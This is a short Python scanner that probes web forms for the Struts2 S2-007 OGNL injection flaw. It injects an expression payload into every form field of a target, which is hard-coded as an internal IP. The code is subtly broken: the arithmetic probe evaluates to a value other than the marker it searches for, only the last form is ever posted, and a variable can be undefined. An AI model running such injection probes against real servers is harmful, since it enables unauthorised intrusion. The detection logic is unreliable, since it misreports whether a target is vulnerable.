import requests
import re
import urllib


def s2_007(url):
    relsult = {
        'name': 'S2-007 Remote Code Execution Vulnerablity',
        'vulnerable': False
    }
    try:
        s = requests.Session()
        response = s.get(url, timeout=3)
        forms = re.findall(r'<form.*</form>', response.text, re.DOTALL)
        for form in forms:
            action = re.findall(r'action="([^"]*)"', form)[0]
            vulurl = urllib.parse.urljoin(url, action)
            inputs = re.findall(r'<input.*>', form)
            first = True
            payload = ''
            for input in inputs:
                try:
                    p = re.findall(r'name=[\'\"]([^\'\"]+)[\'\"]', input)[0]
                    if first:
                        payload += p + '={0}'
                        first = False
                    else:
                        payload += '&' + p + '={0}'
                except:
                    continue
            payload = payload.format(r"'%2b(95221%2b924%2b524)%2b'")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        req = s.post(vulurl, data=payload, headers=headers, timeout=3)
        if re.search(r'95221924524', req.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = vulurl
            relsult['position'] = 'data'
            relsult['payload'] = payload
        return relsult

    except:
        return relsult




if __name__ == '__main__':
    url = 'http://192.168.54.203:8080/'
    print(s2_007(url))